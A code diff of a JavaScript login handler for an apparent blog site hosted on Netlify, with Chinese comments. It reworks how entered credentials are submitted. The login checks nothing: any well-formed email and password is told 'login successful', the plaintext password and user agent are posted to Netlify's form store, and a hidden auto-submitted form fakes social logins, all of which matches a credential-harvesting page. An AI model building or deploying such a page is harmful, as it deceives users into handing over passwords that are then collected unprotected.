@@ -264,9 +264,6 @@ class BlogLogin {
     }
 
     handleEmailLogin(e) {
-        // 阻止表单默认提交
-        e.preventDefault();
-
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         const rememberMe = document.getElementById('rememberMe').checked;
@@ -275,20 +272,20 @@ class BlogLogin {
         if (!email || !password) {
             this.dataCollector.trackLogin(email || '-', 'failed', 'email');
             this.showNotification('请填写所有字段', 'error');
+            e.preventDefault();
             return;
         }
 
         if (!this.isValidEmail(email)) {
             this.dataCollector.trackLogin(email, 'failed', 'email');
             this.showNotification('请输入有效的邮箱地址', 'error');
+            e.preventDefault();
             return;
         }
 
-        // 显示加载状态
-        const submitBtn = document.querySelector('.login-btn');
-        const originalText = submitBtn.innerHTML;
-        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 提交中...';
-        submitBtn.disabled = true;
+        // 验证通过，填充隐藏字段
+        document.getElementById('timestamp').value = new Date().toISOString();
+        document.getElementById('userAgent').value = navigator.userAgent;
 
         // 记录登录数据
         this.dataCollector.trackLogin(email, 'success', 'email');
@@ -300,70 +297,12 @@ class BlogLogin {
         // 显示成功消息
         this.showNotification('登录成功！正在提交表单...', 'success');
 
-        // 使用 fetch 提交表单到 Netlify
-        this.submitEmailLoginToNetlify(email, password, rememberMe)
-            .then(() => {
-                // 提交成功后直接跳转到 blog.html
-                setTimeout(() => {
-                    window.location.href = `blog.html?email=${encodeURIComponent(email)}&submitted=1`;
-                }, 500);
-            })
-            .catch(() => {
-                // 即使失败也跳转（演示用）
-                setTimeout(() => {
-                    window.location.href = `blog.html?email=${encodeURIComponent(email)}&submitted=1`;
-                }, 500);
-            });
-    }
-
-    // 提交邮箱登录到 Netlify
-    async submitEmailLoginToNetlify(email, password, rememberMe) {
-        const formData = new FormData();
-
-        // 添加表单字段
-        formData.append('email', email);
-        formData.append('password', password);
-        formData.append('rememberMe', rememberMe ? '是' : '否');
-        formData.append('loginMethod', 'email');
-        formData.append('timestamp', new Date().toISOString());
-        formData.append('userAgent', navigator.userAgent);
-
-        // 提交到当前页面（Netlify 会自动处理并跳转到 _next 指定的页面）
-        const response = await fetch('/', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: new URLSearchParams(formData).toString()
-        });
-
-        if (!response.ok) {
-            throw new Error('提交失败');
-        }
-
-        return true;
-    }
-
-    // 提交社交登录到 Netlify
-    async submitSocialLoginToNetlify(method, email) {
-        const formData = new FormData();
-
-        formData.append('email', `${method}@social.com`);
-        formData.append('password', '[社交登录]');
-        formData.append('rememberMe', '否');
-        formData.append('loginMethod', method);
-        formData.append('timestamp', new Date().toISOString());
-        formData.append('userAgent', navigator.userAgent);
-
-        const response = await fetch('/', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: new URLSearchParams(formData).toString()
-        });
-
-        if (!response.ok) {
-            throw new Error('提交失败');
-        }
-
-        return true;
+        // 让表单自然提交到 Netlify（这样 Netlify 才能识别表单）
+        // 延迟一点时间显示消息，然后提交
+        setTimeout(() => {
+            // 使用 _next 参数自动跳转
+            // 什么也不做，让表单自然提交
+        }, 100);
     }
 
     togglePasswordVisibility() {
@@ -390,7 +329,6 @@ class BlogLogin {
 
         // 显示加载状态
         const btn = e.target.closest('button');
-        const originalText = btn.innerHTML;
         btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 处理中...';
         btn.disabled = true;
 
@@ -403,20 +341,54 @@ class BlogLogin {
         // 显示成功消息
         this.showNotification(`${provider} 登录成功！正在提交表单...`, 'success');
 
-        // 提交表单到 Netlify
-        this.submitSocialLoginToNetlify(method, email)
-            .then(() => {
-                // 提交成功后跳转到博客首页
-                setTimeout(() => {
-                    window.location.href = `blog.html?email=${encodeURIComponent(email)}&method=${method}`;
-                }, 500);
-            })
-            .catch(() => {
-                // 即使失败也跳转（演示用）
-                setTimeout(() => {
-                    window.location.href = `blog.html?email=${encodeURIComponent(email)}&method=${method}`;
-                }, 500);
-            });
+        // 动态创建表单并提交到 Netlify
+        setTimeout(() => {
+            this.createAndSubmitForm(method, email);
+        }, 300);
+    }
+
+    // 动态创建表单并提交
+    createAndSubmitForm(method, email) {
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = '/';
+        form.style.display = 'none';
+
+        // 添加 form-name 字段（Netlify 识别表单的关键）
+        const formNameInput = document.createElement('input');
+        formNameInput.type = 'hidden';
+        formNameInput.name = 'form-name';
+        formNameInput.value = 'login-form';
+        form.appendChild(formNameInput);
+
+        // 添加 _next 字段
+        const nextInput = document.createElement('input');
+        nextInput.type = 'hidden';
+        nextInput.name = '_next';
+        nextInput.value = 'blog.html';
+        form.appendChild(nextInput);
+
+        // 添加表单数据
+        const fields = {
+            'email': `${method}@social.com`,
+            'password': '[社交登录]',
+            'rememberMe': '否',
+            'loginMethod': method,
+            'timestamp': new Date().toISOString(),
+            'userAgent': navigator.userAgent
+        };
+
+        for (const [name, value] of Object.entries(fields)) {
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = name;
+            input.value = value;
+            form.appendChild(input);
+        }
+
+        // 提交表单
+        document.body.appendChild(form);
+        form.submit();
     }
 
     submitSocialLoginInBackground(method) {
